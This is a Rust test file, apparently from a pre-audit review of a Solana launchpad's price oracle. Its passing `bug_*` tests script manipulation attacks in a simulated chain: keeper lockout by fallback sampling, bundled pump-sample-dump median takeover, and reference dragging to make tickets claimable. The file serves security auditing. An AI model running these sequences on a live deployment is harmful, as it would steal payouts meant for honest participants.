//! Pre-audit review of the venue / oracle module (router, record_samples, median,
//! D10 reference, execute_buyback). Every `bug_*` test PASSES while the issue it
//! demonstrates exists; fixing the issue should make it fail (then flip/delete it).
//!
//! All scenarios run on a real coin (create → curve → graduate into the real PumpSwap
//! program) via `flow.rs`. "Bundles" are consecutive transactions at the same timestamp.

use fumpad::{error::FumpadError, events::Trade, math::price::meets_multiple, state::*};
use solana_keypair::Keypair;

use crate::flow::*;
use crate::*;

const TEN_X: u32 = 100_000;

/// Whale fills the curve (≈85 SOL), graduate, observations + queue + buyback setup.
/// The ring's keeper clock starts at `init_observations` time.
fn graduated(f: &mut Flow) -> Keypair {
    let whale = f.env.new_user(1_000);
    ok(f.buy(&whale, 200 * SOL));
    assert_eq!(f.coin_state().status, CoinStatus::Complete);
    ok(f.graduate());
    f.post_graduation_setup();
    whale
}

/// (effective quote, base) of the pool.
fn pool_reserves(f: &Flow) -> (u128, u128) {
    let base = token_balance(&f.env, &f.pool_base) as u128;
    let quote = (f.spot_q64() * base) >> 64;
    (quote, base)
}

fn obs(f: &Flow) -> Observations {
    f.env.fetch_zc(&f.observations)
}

/// Fallback (non-keeper) sample, in its own isolated transaction.
fn fallback_sample(f: &mut Flow, who: &Keypair) -> litesvm::types::TransactionResult {
    let i = f.sample_ix(&kp_pk(who));
    f.env.send_as(who, &[i], &[who])
}

/// Direct PumpSwap dump of `dump` tokens by `trader` (outside FUMPAD).
fn direct_dump(f: &mut Flow, trader: &Keypair, dump: u64) {
    let i = f.direct_sell_ix(&kp_pk(trader), dump);
    ok(f.env.send_as(trader, &[cu_limit(400_000), i], &[trader]));
}

/// Direct PumpSwap buy (WSOL credited up front, as if wrapped). Returns the WSOL put in.
fn direct_buy(f: &mut Flow, trader: &Keypair, quote_in: u64) -> u64 {
    let i = f.direct_buy_ix(&kp_pk(trader), quote_in, true);
    ok(f.env.send_as(trader, &[cu_limit(400_000), i], &[trader]));
    quote_in
}

/// Direct PumpSwap buy that brings the pool's base reserve back to `b0`. Returns WSOL in.
fn direct_restore_base(f: &mut Flow, trader: &Keypair, q0: u128, b0: u128) -> u64 {
    let (_, b1) = pool_reserves(f);
    let need = q0 - q0 * b0 / b1;
    direct_buy(f, trader, (need * 1_004 / 1_000) as u64)
}

fn wsol_of(f: &Flow, who: &Keypair) -> u64 {
    token_balance(&f.env, &ata(&kp_pk(who), &fumpad::external::pumpswap::WSOL_MINT, &TOKEN))
}

// ═════════════════════════════════════════════════════════════════════════════
// 1. Fallback samplers can lock the keeper out (spacing applies to keeper samples too)
// ═════════════════════════════════════════════════════════════════════════════

/// Once a coin's keeper clock is stale, anyone may sample. The 10 s spacing rule is
/// checked against the LAST SAMPLE OF ANY KIND, and fallback samples never refresh
/// `last_keeper_sample_ts`. A fallback sampler that lands a sample every 10 s therefore
/// makes every keeper sample in between fail with `SampleTooSoon`; the keeper can only
/// regain control by winning the single slot at `last + 10 s` against the squatter, and
/// until it does the coin stays in fallback mode indefinitely.
#[test]
fn bug_fallback_sampler_can_lock_out_the_keeper() {
    let mut f = Flow::new();
    let _whale = graduated(&mut f);
    let squatter = f.env.new_user(10);
    f.env.warp(601); // keeper stale (no heartbeat yet / outage)

    for _ in 0..30 {
        // Squatter wins the slot where spacing reopens…
        ok(fallback_sample(&mut f, &squatter));
        // …so every keeper attempt during the next 10 s is rejected.
        for step in [1, 2, 2, 2, 2] {
            f.env.warp(step); // t+1, t+3, t+5, t+7, t+9
            expect_err(f.keeper_sample(), FumpadError::SampleTooSoon);
        }
        f.env.warp(1); // t+10: the squatter takes this slot again
    }
    let o = obs(&f);
    assert_eq!(o.len, 30);
    assert!((0..30).all(|i| o.samples[i].fallback == 1), "every sample in the ring is a fallback sample");
    // 5 minutes of squatting and the keeper clock never moved: fallback is still open.
    assert!(f.now() - o.last_keeper_sample_ts > 600 + 290);
}

// ═════════════════════════════════════════════════════════════════════════════
// 2. Keeper outage: bundled fallback samples alone decide the median
// ═════════════════════════════════════════════════════════════════════════════

/// The isolation check only stops "pump + sample" inside ONE transaction. In fallback
/// mode an attacker sends [pump tx][isolated sample tx][dump tx] as a bundle; samples are
/// flagged `fallback` but count in the median exactly like keeper samples. After a keeper
/// outage of ~25 min (10 min until fallback opens + 90 samples × 10 s; 60 of them pumped
/// ~16x, 30 free fillers), the attacker's samples satisfy coverage and fix the median, so
/// a ticket whose coin never moved becomes claimable ("10x"). Cost here: ~65 SOL of
/// PumpSwap round-trip fees on an 85 SOL pool (most of it LP fee → FUMPAD's locked LP);
/// it shrinks linearly with the pump needed (tickets already close to their trigger).
/// Contradicts the comment in `venue_tests::manipulation_pump_and_sample_in_same_tx_or_bundle`
/// ("a keeper outage pauses claims rather than letting a few fallback samples decide").
#[test]
fn bug_keeper_outage_bundled_fallback_samples_set_the_median() {
    let mut f = Flow::new();
    let _whale = graduated(&mut f);
    // Honest seller: router buy, matures, router sell at the genuine price → ticket.
    let seller = f.env.new_user(100);
    let sk = kp_pk(&seller);
    ok(f.swap_buy(&seller, 5 * SOL));
    f.keeper_samples(45, 15); // ~11 min of healthy keeper sampling
    let ticket = f.next_ticket(&sk);
    ok(f.swap_sell(&seller, f.tokens(&sk)));
    let t = f.ticket(&ticket);
    assert_eq!(t.status, TicketStatus::Open);
    let genuine = f.spot_q64();

    // Keeper goes down. 10 min later sampling is permissionless.
    f.env.warp(601);
    let attacker = f.env.new_user(10);
    let ak = kp_pk(&attacker);
    let mk_ata = create_ata_ix(&ak, &ak, &f.mint, &T22);
    ok(f.env.send_as(&attacker, &[mk_ata], &[&attacker]));
    let (q0, b0) = pool_reserves(&f);
    let mut pumped_samples = 0;
    let mut wsol_in: u64 = 0;
    for i in 0..90 {
        if i % 3 != 2 {
            // Bundle: pump (×~16 price: buy 3× the quote reserve) → sample → dump back.
            let before = f.tokens(&ak);
            wsol_in += direct_buy(&mut f, &attacker, (q0 * 3) as u64);
            assert!(f.spot_q64() > genuine * 11, "pumped {} vs genuine {genuine}, q0 {q0}", f.spot_q64());
            ok(fallback_sample(&mut f, &attacker));
            let got = f.tokens(&ak) - before;
            direct_dump(&mut f, &attacker, got);
            pumped_samples += 1;
        } else {
            // Unpumped filler sample (free) to reach coverage.
            ok(fallback_sample(&mut f, &attacker));
        }
        f.env.warp(10);
    }
    let cost = wsol_in - wsol_of(&f, &attacker);
    println!(
        "fallback median takeover: {pumped_samples} pumped bundles, round-trip cost {} SOL on a {} SOL pool",
        cost as f64 / SOL as f64,
        q0 as f64 / SOL as f64
    );
    let (_, b1) = pool_reserves(&f);
    assert!(b1.abs_diff(b0) * 100 < b0, "every pump was dumped back");
    // The round trips leave their PumpSwap LP fees in the pool (spot drifts up ~40%), but the
    // coin never trades anywhere near 10x outside the attacker's own bundles.
    assert!(f.spot_q64() < genuine * 2, "spot {} vs {genuine}", f.spot_q64());

    let o = obs(&f);
    let p = Params::default();
    let median = o.median_price_q64(f.now(), p.oracle_window_secs, p.oracle_min_samples).unwrap();
    assert_eq!(pumped_samples, 60); // + 30 free filler samples; ~20 older keeper samples still in the window
    assert!(meets_multiple(median, t.sell_price_q64, TEN_X), "median {median} vs ticket {}", t.sell_price_q64);
    // Claim succeeds (paid or queued) although the coin never traded above ~1x.
    ok(f.claim(&seller, ticket));
    assert_ne!(f.ticket(&ticket).status, TicketStatus::Open);
}

// ═════════════════════════════════════════════════════════════════════════════
// 3. D10 reference dragged on a coin the keeper doesn't heartbeat
// ═════════════════════════════════════════════════════════════════════════════

/// SPEC §5.3 says dragging the reference needs ~11 staged 150 s intervals "with no other
/// FUMPAD touch on the coin" and that "the keeper heartbeat (§5.4) closes such windows".
/// But the §5.4 policy only heartbeats coins WITH open tickets, and a coin without a
/// keeper sample for 10 min accepts permissionless (fallback) samples — which are D10
/// touch points. So on any graduated coin with no open tickets the attacker needs no
/// FUMPAD trade at all: [dump → fallback sample → rebuy] every 150 s for ~30 min, then
/// [dump → swap_sell (ticket) → rebuy]. The ticket is priced at the dragged reference
/// (≈ 1/10 of the genuine price); once the keeper starts sampling (the ticket now exists)
/// the 30-min median at the untouched genuine price makes it claimable.
#[test]
fn bug_reference_dragged_on_unheartbeated_coin_yields_claimable_ticket() {
    let mut f = Flow::new();
    let whale = graduated(&mut f);
    let wk = kp_pk(&whale);
    // ~1 h of keeper sampling (e.g. while earlier tickets were open): the reference
    // converges to the genuine price. Then the coin has no open tickets → per the §5.4
    // policy no more heartbeats; 10 min later the keeper clock is stale.
    f.keeper_samples(250, 15);
    f.env.warp(601);
    let genuine = f.spot_q64();
    let ref0 = f.coin_state().reference.avg_q64;
    assert!(ref0.abs_diff(genuine) * 100 < genuine, "honest reference ≈ spot");
    let (q0, b0) = pool_reserves(&f);
    let dump = (b0 * 347 / 100) as u64; // ~20x crash
    assert!(f.tokens(&wk) > dump + 30_000_000_000_000);

    let mut bundles = 0;
    let mut wsol_in: u64 = 0;
    let wsol0 = wsol_of(&f, &whale);
    loop {
        direct_dump(&mut f, &whale, dump);
        ok(fallback_sample(&mut f, &whale)); // free D10 touch point at the crashed spot
        wsol_in += direct_restore_base(&mut f, &whale, q0, b0);
        bundles += 1;
        let r = f.coin_state().reference.avg_q64;
        if r * 105 <= genuine * 10 || bundles > 20 {
            break;
        }
        f.env.warp(150);
    }
    assert!(bundles <= 14, "{bundles} bundles");
    // Round-trip cost of all crash bundles (PumpSwap fees + rebuy gross-up).
    let cost = (wsol_in + wsol0) as i128 - wsol_of(&f, &whale) as i128;
    let dragged = f.coin_state().reference.avg_q64;
    assert!(dragged * 10 < ref0, "reference dragged below 1/10: {dragged} vs {ref0}");
    assert!(f.spot_q64().abs_diff(genuine) * 10 < genuine, "genuine price ~restored after every bundle: {} vs {genuine}", f.spot_q64());

    // Final bundle: dump → FUMPAD sell (ticket) → rebuy.
    f.env.warp(150);
    direct_dump(&mut f, &whale, dump);
    let ticket = f.next_ticket(&wk);
    let m = ok(f.swap_sell(&whale, 30_000_000_000_000));
    direct_restore_base(&mut f, &whale, q0, b0);
    let exec = events::<Trade>(&m)[0].price_q64;
    let t = f.ticket(&ticket);
    assert_eq!(t.status, TicketStatus::Open);
    assert!(t.sell_price_q64 * 10 < genuine, "ticket {} vs genuine {genuine} (exec {exec})", t.sell_price_q64);

    // Now the coin has an open ticket → keeper samples (full rate) at the genuine price.
    f.keeper_samples(125, 15);
    let median = f.median().unwrap();
    assert!(median.abs_diff(genuine) * 10 < genuine, "median {median} ≈ genuine {genuine}");
    assert!(meets_multiple(median, t.sell_price_q64, TEN_X));
    ok(f.claim(&whale, ticket));
    assert_eq!(f.ticket(&ticket).status, TicketStatus::Claimed, "claim paid on a coin that never moved");
    println!(
        "D10 drag: {bundles} staged bundles over {} s, dump {:.2}x pool base each, crash-bundle cost ≈ {:.2} SOL \
         (pool {:.1} SOL), ticket at {:.3} of genuine",
        bundles * 150,
        dump as f64 / b0 as f64,
        cost as f64 / SOL as f64,
        q0 as f64 / SOL as f64,
        t.sell_price_q64 as f64 / genuine as f64
    );
}

// ═════════════════════════════════════════════════════════════════════════════
// 4. "30-min median with 70% coverage" is a sample count, not time coverage
// ═════════════════════════════════════════════════════════════════════════════

/// Coverage is `n ≥ 84` samples with ts in the last 30 min. With 10 s spacing allowed,
/// 84 samples fit in 830 s, so a price that has existed for ~14 minutes (half of that,
/// ~7 min, above the trigger) yields a "30-minute" median. Under the §5.4 keeper policy
/// (full rate only once spot ≥ 50% of a trigger, heartbeats otherwise) low-price periods
/// are under-sampled, so the median is biased toward the high-price period too.
#[test]
fn bug_median_coverage_is_sample_count_not_time() {
    let mut f = Flow::new();
    let _whale = graduated(&mut f);
    f.env.warp(1_800);
    f.keeper_samples(84, 10);
    let o = obs(&f);
    let p = Params::default();
    let first = o.samples[0].ts;
    assert_eq!(f.now() - first, 830);
    assert!(o.median_price_q64(f.now(), p.oracle_window_secs, p.oracle_min_samples).is_some(), "median after 13.8 min");
}
